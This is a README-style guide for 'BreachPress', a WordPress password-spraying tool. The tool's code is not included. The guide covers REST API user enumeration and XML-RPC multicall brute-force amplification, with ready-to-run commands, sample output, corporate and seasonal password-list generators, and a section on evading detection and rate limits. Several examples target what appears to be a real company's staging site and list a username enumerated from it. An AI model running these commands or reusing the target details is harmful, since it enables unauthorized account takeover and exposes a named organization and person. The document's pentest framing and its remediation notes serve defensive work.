# BreachPress - Complete Package

## 📦 Package Contents

This package includes everything you need for WordPress authentication testing:

1. **breachpress.py** - Main tool (Python 3.6+)
2. **README.md** - Comprehensive documentation
3. **QUICKSTART.md** - Quick start guide with examples
4. **example_users.txt** - Sample username wordlist
5. **example_passwords.txt** - Sample password wordlist

## 🚀 Getting Started (30 seconds)

```bash
# 1. Extract files
cd /path/to/extracted/files

# 2. Make executable
chmod +x breachpress.py

# 3. Test against a target (enumeration only - safe)
python3 breachpress.py -u https://target.com --enumerate-only
```

## 💡 Key Features

### Attack Surface Enumeration
- ✅ Detects wp-login.php
- ✅ Checks REST API user enumeration
- ✅ Identifies XML-RPC availability
- ✅ Tests for system.multicall support

### User Enumeration
- ✅ Automatic via REST API (`/wp-json/wp/v2/users`)
- ✅ Manual validation via wp-login.php

### Password Spraying Methods
1. **XML-RPC Multicall** ⭐ BEST
   - 100+ credentials per HTTP request
   - Bypasses rate limiting
   - Fastest method available

2. **XML-RPC Single**
   - Individual XML-RPC requests
   - Good fallback option

3. **wp-login.php**
   - Traditional form-based auth
   - Most compatible

### Smart Features
- ✅ Auto-selects best attack method
- ✅ Colored terminal output
- ✅ Batch processing
- ✅ Configurable delays
- ✅ Results saving
- ✅ Verbose logging

## 📊 Usage Examples

### Example 1: Full Recon
```bash
python3 breachpress.py -u https://stage.cambrex.com --enumerate-only
```

**Output:**
```
[*] Enumerating Attack Surface...
[+] wp-login.php: Available
[+] REST API: Available
[+] XML-RPC: Available
[++] XML-RPC system.multicall: Available (BEST ATTACK VECTOR)

[*] Enumerating users via REST API...
[+] Found user: admin
[+] Found user: danielmcginn
```

### Example 2: Auto-Enum + Spray
```bash
python3 breachpress.py -u https://stage.cambrex.com \
    --auto-enum \
    -P example_passwords.txt \
    -o results.txt \
    -v
```

**What it does:**
1. Enumerates users from REST API
2. Selects XML-RPC multicall (if available)
3. Tests all user/password combinations
4. Saves successful creds to results.txt

### Example 3: Manual Lists
```bash
python3 breachpress.py -u https://target.com \
    -U example_users.txt \
    -P example_passwords.txt \
    --method xmlrpc-multicall \
    --batch-size 200
```

**Efficiency:**
- 9 users × 40 passwords = 360 attempts
- With multicall (batch 200): Only 2 HTTP requests!
- Without multicall: 360 HTTP requests

### Example 4: Stealthy Mode
```bash
python3 breachpress.py -u https://target.com \
    -U users.txt \
    -P passwords.txt \
    --delay 5.0 \
    --method wp-login
```

## 🎯 Real-World Workflow

### Scenario: External Pentest

```bash
# Phase 1: Intelligence Gathering
python3 breachpress.py -u https://target.com --enumerate-only

# Phase 2: User Enumeration
# (Already done in Phase 1 if REST API available)

# Phase 3: Create Targeted Password List
cat > corporate_passwords.txt << EOF
TargetCompany2024!
TargetCompany2025!
Welcome2024!
Summer2024!
Winter2024!
Spring2025!
Password123!
EOF

# Phase 4: Execute Spray
python3 breachpress.py -u https://target.com \
    --auto-enum \
    -P corporate_passwords.txt \
    --method auto \
    -o successful_creds.txt \
    -v

# Phase 5: Review Results
cat successful_creds.txt
```

## 🔧 Common Scenarios

### Testing a Specific User
```bash
python3 breachpress.py -u https://target.com \
    --user admin \
    --password 'Company2024!'
```

### Testing Multiple Methods
```bash
# Try multicall first
python3 breachpress.py -u https://target.com \
    --user admin --password 'Test123!' \
    --method xmlrpc-multicall

# Fallback to wp-login
python3 breachpress.py -u https://target.com \
    --user admin --password 'Test123!' \
    --method wp-login
```

### Large Scale Spray
```bash
# 1000 passwords against discovered users
python3 breachpress.py -u https://target.com \
    --auto-enum \
    -P large_passwordlist.txt \
    --batch-size 500 \
    --timeout 30 \
    -v
```

## 📝 Creating Custom Wordlists

### Season-Based Passwords
```bash
cat > seasonal.txt << EOF
Winter2024
Winter2024!
Winter2025
Winter2025!
Spring2024
Spring2025
Summer2024
Summer2025
Autumn2024
Fall2024
EOF
```

### Corporate Pattern Generator
```bash
#!/bin/bash
COMPANY="Cambrex"
for year in 2024 2025; do
    echo "${COMPANY}${year}"
    echo "${COMPANY}${year}!"
    echo "${COMPANY}@${year}"
done > company_passwords.txt
```

### Month-Based
```bash
for month in Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec; do
    for year in 2024 2025; do
        echo "${month}${year}"
        echo "${month}${year}!"
    done
done > monthly_passwords.txt
```

## 🔍 Understanding XML-RPC Multicall

### Why It's Powerful

**Traditional Method:**
```
Request 1: admin:password1
Request 2: admin:password2
Request 3: admin:password3
...
Request 100: admin:password100
```
= 100 HTTP requests, easy to detect and rate limit

**Multicall Method:**
```
Request 1: [
    admin:password1,
    admin:password2,
    admin:password3,
    ...
    admin:password100
]
```
= 1 HTTP request for 100 attempts!

### Batch Size Impact

| Batch Size | Total Attempts | HTTP Requests |
|------------|----------------|---------------|
| 50         | 500            | 10            |
| 100        | 500            | 5             |
| 200        | 500            | 3             |
| 500        | 500            | 1             |

Larger batch = fewer requests = harder to detect

## 🛡️ Detection Evasion

### Techniques Built-In

1. **Configurable Delays**
   ```bash
   --delay 3.0  # 3 second pause between requests
   ```

2. **Batch Size Control**
   ```bash
   --batch-size 50  # Smaller batches for cautious testing
   ```

3. **Method Selection**
   ```bash
   --method wp-login  # Use traditional method if needed
   ```

4. **SSL Bypass**
   ```bash
   --no-ssl-verify  # For self-signed certs
   ```

### Manual Enhancements

You can modify the code to add:
- Custom User-Agent strings
- Proxy support
- Request header randomization
- Cookie handling

## 📈 Performance Comparison

Test scenario: 10 users, 100 passwords = 1000 attempts

| Method            | HTTP Requests | Approx Time* |
|-------------------|---------------|--------------|
| wp-login          | 1000          | ~17 minutes  |
| XML-RPC Single    | 1000          | ~17 minutes  |
| XML-RPC Multicall | 10 (batch100) | ~1 minute    |

*With 1 second delay between requests

## 🎓 Professional Tips

### For Pentest Reports

Document these findings:

1. **User Enumeration** (Low-Medium)
   - REST API exposes usernames
   - Recommendation: Disable or restrict

2. **XML-RPC Enabled** (Medium)
   - Legacy API active
   - Recommendation: Disable if unused

3. **XML-RPC Multicall** (Medium-High)
   - Enables brute force amplification
   - Recommendation: Disable system.multicall

4. **No Rate Limiting** (Medium)
   - Unlimited authentication attempts
   - Recommendation: Implement rate limiting

5. **No Account Lockout** (Low-Medium)
   - No lockout after failed attempts
   - Recommendation: Add lockout policy

### Best Practices

1. **Always get authorization**
2. **Document your scope**
3. **Use from authorized IPs**
4. **Monitor resource usage**
5. **Coordinate with blue team**

## 🐛 Troubleshooting

### No Users Found
- REST API might be disabled
- Use manual user list: `-U users.txt`

### Connection Errors
- SSL issues: Add `--no-ssl-verify`
- Timeout: Increase with `--timeout 30`

### Rate Limited
- Increase delays: `--delay 5.0`
- Reduce batch size: `--batch-size 25`

### No Methods Available
- Target is hardened
- Try manual testing
- Check for WAF blocking

## 📚 Additional Resources

- WordPress Hardening: https://wordpress.org/support/article/hardening-wordpress/
- XML-RPC Documentation: https://codex.wordpress.org/XML-RPC_Support
- REST API Security: https://developer.wordpress.org/rest-api/

## ⚖️ Legal Notice

**This tool is for authorized security testing only.**

- ✅ Use with written permission
- ✅ Document in SOW/ROE
- ✅ Follow responsible disclosure
- ❌ Never use on systems you don't own
- ❌ Never use for malicious purposes

Unauthorized access is illegal under CFAA and similar laws worldwide.

## 🔄 Version History

**v1.0.0** - Initial Release
- Full attack surface enumeration
- REST API user enumeration
- Three attack methods (multicall, single, wp-login)
- Auto-method selection
- Batch processing
- Result saving
- Verbose logging

## 👤 Author

**Michael @ Breach Craft**

Professional penetration tester specializing in web application security,
Active Directory attacks, and comprehensive security assessments.

## 🙏 Acknowledgments

This tool was created for legitimate penetration testing engagements and
security research. Use responsibly and ethically.

---

**Happy (Authorized) Hacking! 🔐**
